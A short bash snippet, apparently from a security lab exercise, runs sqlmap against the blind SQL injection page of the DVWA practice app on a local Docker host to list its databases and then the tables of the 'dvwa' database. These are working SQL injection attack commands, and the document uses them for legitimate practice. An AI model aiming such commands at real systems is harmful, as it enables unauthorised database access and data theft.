
```bash
sqlmap -u "http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4;security=low" --dbs

sqlmap -u "http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4;security=low" -D dvwa --tables
```
